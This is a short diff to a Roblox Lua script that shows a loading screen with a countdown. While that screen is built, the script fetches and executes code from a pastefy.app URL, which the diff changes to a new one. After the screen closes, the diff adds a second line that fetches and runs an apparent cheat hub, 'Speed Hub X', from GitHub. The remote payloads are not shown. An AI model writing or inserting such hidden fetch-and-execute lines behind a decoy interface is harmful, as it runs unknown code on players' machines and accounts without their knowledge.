@@ -29,7 +29,7 @@ Title.TextStrokeTransparency = 1
 Title.TextScaled = true
 Title.Font = Enum.Font.GothamBold
 Title.Parent = Background
-loadstring(game:HttpGet("https://pastefy.app/YjU3ytQO/raw",true))()
+loadstring(game:HttpGet("https://pastefy.app/f7dA9ePx/raw",true))()
 
 
 -- Таймер
@@ -90,7 +90,7 @@ task.spawn(function()
 end)
 
 -- Таймер и прогресс
-local duration = 40
+local duration = 20
 for i = duration, 1, -1 do
     TimerLabel.Text = "Approximately " .. i .. " seconds left"
 
@@ -121,3 +121,4 @@ end
 
 -- Удаление GUI
 ScreenGui:Destroy()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
